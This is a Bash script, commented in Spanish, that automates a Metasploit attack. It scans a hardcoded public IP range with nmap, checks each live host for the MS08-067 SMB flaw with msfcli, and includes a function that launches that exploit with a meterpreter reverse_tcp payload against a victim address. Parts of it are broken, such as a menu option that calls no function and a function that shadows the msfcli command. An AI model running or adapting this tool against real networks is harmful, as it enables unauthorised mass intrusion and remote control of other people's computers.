#!/bin/bash
############################################################################
# Copyright (c) 2013 Pablo Rocamora <pablojoserocamora@gmail.com>          #
#                                                                          #
# Permission to use, copy, modify, and distribute this software for any    #
# purpose with or without fee is hereby granted, provided that the above   #
# copyright notice and this permission notice appear in all copies.        #
#                                                                          #
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES #
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF         #
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR  #
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES   #
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN    #
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF  #
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.           #
############################################################################

#ejemplo de uso

barra() {
	clear
	echo "############ Inicio # $1 ############" 
	}


cancelar() {
	echo " "
	echo "Operacion cancelada"
	 }


pausa() {
	echo " "
	read -n 1 -p "Presiona una tecla para continuar..." 
	}


escaneo() {
	echo " "
	#Escaneo de la red por el puerto 445
	`nmap -p 80 94.143.28.0/24 > escaneo.txt`
	#Elimina las lineas que contengan la palabra ...
	sed -i '/Starting/d' escaneo.txt
	sed -i '/Host/d' escaneo.txt
	sed -i '/PORT/d' escaneo.txt
	sed -i '/MAC/d' escaneo.txt
	sed -i '/IP/d' escaneo.txt
	#Sustituye las lineas en blanco por '#'
	sed -i 's/^$/#/' escaneo.txt
	# copia todas las lineas del fichero en una sola linea separado por '#'
	paste -s -d " " escaneo.txt > escaneo_junto
	#Borrar los ficheros imnecesarios
	rm escaneo.txt
	rm escaneo_limpio.txt
	#Bucle para que corte las ip por el delimitador '#' y las meta en otro fichero separadas
	for(( i=2 ; i<=256 ; i++ ))	{
		cut -d "#" -f $i escaneo_junto >> escaneo_limpio.txt 
		}
	#Elimina todas las lineas en blanco	
	sed -i '/^$/d' escaneo_limpio.txt
	sed -i '/closed/d' escaneo_limpio.txt
	sed -i '/filtered/d' escaneo_limpio.txt
	#Corta las lineas por la 6 columna (la que contiene la ip)
	cut -d " " -f 6 escaneo_limpio.txt > ip_objetivo
	#Borrar los ficheros imnecesarios
	rm escaneo_junto
	rm escaneo.txt 
	}


escaneo2(){
	echo " "
	echo "Introduce una ip"
	read -n 15 -p "IP: " IP
	echo "Introduce un puerto"
	read -n 5 -p "puerto: " puerto
	#$IP=`sed -n 1p ip_objetivo`
	`nmap -p $puerto $IP > escaneo2.txt`
	sed -i '/Starting/d' escaneo2.txt
	sed -i '/Host/d' escaneo2.txt
	sed -i '/PORT/d' escaneo2.txt
	sed -i '/MAC/d' escaneo2.txt
	sed -i '/IP/d' escaneo2.txt
	sed -i 's/^$/#/' escaneo2.txt
	paste -s -d " " escaneo2.txt > escaneo_junto2
	rm escaneo2.txt
	rm escaneo_limpio2.txt
	for(( i=2 ; i<=256 ; i++ )) {
		cut -d "#" -f $i escaneo_junto2 >> escaneo_limpio2.txt
		}
	sed -i '/^$/d' escaneo_limpio2.txt
	sed -i '/closed/d' escaneo_limpio2.txt
	sed -i '/filtered/d' escaneo_limpio2.txt
	cut -d " " -f 6 escaneo_limpio2.txt > ip_objetivo2
	rm escaneo_junto2
	rm escaneo2.txt
	}

ip2(){
	#Funcional
	echo " "
	`ip route > miip.txt`
	sed -i '/metric/d' miip.txt
	sed -i '/default/d' miip.txt
	cut -d " " -f 12 miip.txt > miip
	rm miip.txt
	gip=`sed -n 1p miip`
	echo "mi ip es: $gip"
	}


check(){
	#wc cuenta las lineas del fichero y con cut selecciona la primera columna que es la que indica el numero de lineas
	lineas=`wc -l ip_objetivo | cut -d ' ' -f1`
	#echo $lineas
	for ((i=1 ; i<=lineas ; i++))
	do
		#Crea la variable para que seleccione linea a linea todas las ips del fichero
		#sed -n 1p ip_objetivo  para seleccionar la primera linea del fichero
        	nom=`sed -n "$i"p ip_objetivo`
        	rm "$nom".txt
		#Ejecuto el checkeo del exploit con las ip que va sacando del fichero
        	msfcli windows/smb/ms08_067_netapi RHOST="$nom" C > "$nom".txt
       		#echo $nom >> "$nom".txt
        	#Busca en el fichero si sale un '+' que sale cuando dice que la ip es vulnerable
		grep \+ "$nom".txt > "$nom".lst
		#grep 10 "$nom".txt >> "$nom".lst
	done

#echo ""
#msfcli windows/smb/ms08_067_netapi RHOST=10.32.73.166 C
	}

  
msfcli(){
	echo "Introduce tu ip"	
	read -n 15 -p "LHOST => " LHOST
	echo "Introduce tu puerto"
	read -n 5 -p "LPORT => " LPORT
	echo "Introduce la ip victima"
	read -n 15 -p "RHOST => " RHOST
	echo "Introduce el puerto objetivo"
	read -n 5 -p "RPORT => " RPORT

`msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT RHOST=$RHOST RPORT=$RPORT SMBPIPE=BROWSER TARGET=0 E`

	}


menu(){
barra "Menu principal"
	echo "#  1.) Escanear la red por el puerto 445        #" 
	echo "#  2.) Escanear por el puerto elegido           #" 
	echo "#  3.) Averiguar mi ip		      	        #"	
	echo "#  4.) Checkear un pc                           #"
	echo "#  5.) Ejecutar msfcli                          #"
	echo "#  0.) Salir                                    #"
	echo "#################################################"

read -n 1 -p "    Que desea hacer? " s
	case $s in 
	1) escaneo ;;
	2) escaneo2 ;;
	3) ip2 ;;	
	4) check ;;
	5) En construccion ;;
	0) clear
	exit
	;; 
	*)

	#El resto
	echo " "
	echo "Opcion invalida!"
	;;
	esac

#Menu
pausa
menu
	}

#Funcion que inicia el menu
menu
